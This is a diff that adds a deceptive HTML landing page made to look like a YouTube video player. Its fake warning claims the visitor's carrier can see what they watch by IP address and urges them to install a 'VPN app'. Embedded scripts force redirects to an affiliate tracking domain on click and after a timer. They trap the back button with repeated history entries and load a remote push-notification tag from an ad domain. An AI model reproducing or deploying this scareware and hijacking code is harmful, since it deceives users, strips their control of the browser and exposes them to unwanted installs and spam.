@@ -1,0 +1,190 @@
+<!DOCTYPE html><html lang="en"><head>
+  <base href="">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>Loading</title>
+<link href="jquery-ui.css" rel="stylesheet">
+<script src="jquery-3.4.1.js" type="text/javascript"></script>
+<link rel="icon" href="./favicon.ico" type="image/x-icon">
+<link href="style.min.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" type="text/css" href="style.css">
+<script src="jquery.min.js" type="text/javascript"></script>
+
+
+<script type="text/javascript">
+	function contains(string, fragment) {
+		string = string.toLowerCase();
+		fragment = fragment.toLowerCase();
+		return string.indexOf(fragment) !== -1;
+	}
+	function getURLParameter(name) {
+		var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+		if(name.indexOf('device_name') !== -1 && contains(result, 'generic')) {
+			result = 'Phone'
+		}
+		if(name.indexOf('device_model') !== -1 && contains(result, 'generic')) {
+			result = 'Phone'
+		}
+		if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+			result = 'Internet Browser'
+		}
+		return result;
+	}
+	function getRandomInt(min, max)
+	{
+	  return Math.floor(Math.random() * (max - min + 1)) + min;
+	}
+</script>
+
+</head>
+<body>
+<div class="cont">
+<img id="spin" data-cfsrc="loading.gif" alt="" src="loading.gif">
+</div>
+<div class="ytp-chrome-bottom" data-layer="8">
+<div class="ytp-chrome-controls">
+<div class="ytp-left-controls">
+<a target="_blank" onclick="redirect();">
+<button class="ytp-play-button ytp-button" aria-label="Watch">
+<svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-11"></use>
+<path class="ytp-svg-fill" d="M 12,26 18.5,22 18.5,14 12,10 z M 18.5,22 25,18 25,18 18.5,14 z" id="ytp-id-11"></path>
+</svg>
+</button>
+</a>
+<a target="_blank" onclick="redirect();" class="ytp-next-button ytp-button" title="Next" aria-disabled="false">
+<svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-12"></use>
+<path class="ytp-svg-fill" d="M 12,24 20.5,18 12,12 V 24 z M 22,12 v 12 h 2 V 12 h -2 z" id="ytp-id-12"></path>
+</svg>
+</a>
+<button class="ytp-mute-button ytp-button" data-visual-id="5" title="Disable sound" style="">
+<svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-14"></use>
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-15"></use>
+<defs>
+<clipPath id="ytp-svg-volume-animation-mask">
+<path d="m 14.35,-0.14 -5.86,5.86 20.73,20.78 5.86,-5.91 z"></path>
+<path d="M 7.07,6.87 -1.11,15.33 19.61,36.11 27.80,27.60 z"></path>
+<path class="ytp-svg-volume-animation-mover" d="M 9.09,5.20 6.47,7.88 26.82,28.77 29.66,25.99 z" transform="translate(0, 0)"></path>
+</clipPath>
+<clipPath id="ytp-svg-volume-animation-slash-mask">
+<path class="ytp-svg-volume-animation-mover" d="m -11.45,-15.55 -4.44,4.51 20.45,20.94 4.55,-4.66 z" transform="translate(0, 0)"></path>
+</clipPath>
+</defs>
+<path class="ytp-svg-fill ytp-svg-volume-animation-speaker" clip-path="url(#ytp-svg-volume-animation-mask)" d="M8,21 L12,21 L17,26 L17,10 L12,15 L8,15 L8,21 Z M19,14 L19,22 C20.48,21.32 21.5,19.77 21.5,18 C21.5,16.26 20.48,14.74 19,14 ZM19,11.29 C21.89,12.15 24,14.83 24,18 C24,21.17 21.89,23.85 19,24.71 L19,26.77 C23.01,25.86 26,22.28 26,18 C26,13.72 23.01,10.14 19,9.23 L19,11.29 Z" fill="#fff" id="ytp-id-14"></path>
+<path class="ytp-svg-fill ytp-svg-volume-animation-hider" clip-path="url(#ytp-svg-volume-animation-slash-mask)" d="M 9.25,9 7.98,10.27 24.71,27 l 1.27,-1.27 Z" fill="#fff" id="ytp-id-15" style="display: none;"></path>
+</svg>
+</button>
+<div class="ytp-time-display notranslate" style="">
+<span class="ytp-time-current">0:11</span><span class="ytp-time-separator">
+/
+</span><span class="ytp-time-duration">1:38</span>
+</div>
+</div>
+<div class="ytp-right-controls">
+<button class="ytp-button ytp-settings-button" aria-haspopup="true" aria-owns="ytp-id-17" style="" title="Settings">
+<svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-18"></use>
+<path d="m 23.94,18.78 c .03,-0.25 .05,-0.51 .05,-0.78 0,-0.27 -0.02,-0.52 -0.05,-0.78 l 1.68,-1.32 c .15,-0.12 .19,-0.33 .09,-0.51 l -1.6,-2.76 c -0.09,-0.17 -0.31,-0.24 -0.48,-0.17 l -1.99,.8 c -0.41,-0.32 -0.86,-0.58 -1.35,-0.78 l -0.30,-2.12 c -0.02,-0.19 -0.19,-0.33 -0.39,-0.33 l -3.2,0 c -0.2,0 -0.36,.14 -0.39,.33 l -0.30,2.12 c -0.48,.2 -0.93,.47 -1.35,.78 l -1.99,-0.8 c -0.18,-0.07 -0.39,0 -0.48,.17 l -1.6,2.76 c -0.10,.17 -0.05,.39 .09,.51 l 1.68,1.32 c -0.03,.25 -0.05,.52 -0.05,.78 0,.26 .02,.52 .05,.78 l -1.68,1.32 c -0.15,.12 -0.19,.33 -0.09,.51 l 1.6,2.76 c .09,.17 .31,.24 .48,.17 l 1.99,-0.8 c .41,.32 .86,.58 1.35,.78 l .30,2.12 c .02,.19 .19,.33 .39,.33 l 3.2,0 c .2,0 .36,-0.14 .39,-0.33 l .30,-2.12 c .48,-0.2 .93,-0.47 1.35,-0.78 l 1.99,.8 c .18,.07 .39,0 .48,-0.17 l 1.6,-2.76 c .09,-0.17 .05,-0.39 -0.09,-0.51 l -1.68,-1.32 0,0 z m -5.94,2.01 c -1.54,0 -2.8,-1.25 -2.8,-2.8 0,-1.54 1.25,-2.8 2.8,-2.8 1.54,0 2.8,1.25 2.8,2.8 0,1.54 -1.25,2.8 -2.8,2.8 l 0,0 z" fill="#fff" id="ytp-id-18"></path>
+</svg>
+</button><button class="ytp-size-button ytp-button">
+<svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-20"></use>
+<path d="m 28,11 0,14 -20,0 0,-14 z m -18,2 16,0 0,10 -16,0 0,-10 z" fill="#fff" fill-rule="evenodd" id="ytp-id-20"></path>
+</svg>
+</button><button class="ytp-fullscreen-button ytp-button" title="Full screen">
+<svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+<g class="ytp-fullscreen-button-corner-0">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-22"></use>
+<path class="ytp-svg-fill" d="m 10,16 2,0 0,-4 4,0 0,-2 L 10,10 l 0,6 0,0 z" id="ytp-id-22"></path>
+</g>
+<g class="ytp-fullscreen-button-corner-1">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-23"></use>
+<path class="ytp-svg-fill" d="m 20,10 0,2 4,0 0,4 2,0 L 26,10 l -6,0 0,0 z" id="ytp-id-23"></path>
+</g>
+<g class="ytp-fullscreen-button-corner-2">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-24"></use>
+<path class="ytp-svg-fill" d="m 24,24 -4,0 0,2 L 26,26 l 0,-6 -2,0 0,4 0,0 z" id="ytp-id-24"></path>
+</g>
+<g class="ytp-fullscreen-button-corner-3">
+<use class="ytp-svg-shadow" xlink:href="#ytp-id-25"></use>
+<path class="ytp-svg-fill" d="M 12,20 10,20 10,26 l 6,0 0,-2 -4,0 0,-4 0,0 z" id="ytp-id-25"></path>
+</g>
+</svg>
+</button>
+</div>
+</div>
+</div>
+<div style="padding-top:30px;padding-bottom:10px;position:fixed;width:280px;text-align:center;top:8%;background-color:#fff;border-radius:30px;color: #000;left: 50%;margin-left: -140px;box-shadow: 0px 0px 10px 1px rgba(0, 0, 0, 0.42);">
+<div class="container">
+<div class="row">
+<div class="content">
+<p style="font-size: 20px; line-height: 25px; font-weight: bold;">
+<span>YOUR CARRIER</span> Knows <br>what you're watching
+<br> by your IP Address:
+<span id="variable-ip-address"><script>document.write(getURLParameter("ip"))</script></span>
+</p>
+<img data-cfsrc="images/stop.png" data-cfstyle="width:100px;" alt="Stop" style="width:100px;" src="stop.png">
+<p><small><span style="color:#F00">Step 1:</span> Install from App Store<br><span style="color:#F00">Step 2:</span> Click Connect<br><span style="color:#F00">Step 3:</span> Browse Privately</small>
+</p>
+<p style=" font-weight: bold; line-height: 25px;font-size: 16px;margin-bottom:0px;">
+WATCH VIDEOS PRIVATELY<br>
+using a VPN app (Free Trial)
+</p>
+<p style="border-bottom: 2px solid #bfbfbf;font-size: 16px;margin-top:0px;">
+<span class="blink">Hide your IP Address</span>
+</p>
+<a target="_blank" style=" width: 120px; height: 40px; font-size: 20px;" onclick="redirect();" rel="noreferrer">Install</a>
+</div>
+</div>
+</div>
+</div>
+
+ </script>
+    <script type="text/javascript">
+    function redirect() {
+       window.open('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1');
+       setTimeout(function () {
+         window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2";
+       },  5000)
+     }
+    </script>
+ 
+  <script type="text/javascript">
+    setTimeout(function () {
+      window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1";
+    }, 180000);
+  </script>
+
+<script type="text/javascript">
+    ! function () {
+        var t;
+        try {
+            const URL = window.location.href.split(/[#]/)[0];
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
+            onpopstate = function(event){
+                event.state && location.replace('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1');
+            }
+        } catch (o) { console.log( o ); }
+    }();
+</script>
+
+<script>
+    var s = document.createElement('script');
+    s.src='//ouphouch.com/pfe/current/micro.tag.min.js?z=4947068'+'&sw=/sw-check-permissions-747a6.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+
+    document.head.appendChild(s);
+</script>
+
+</body></html>
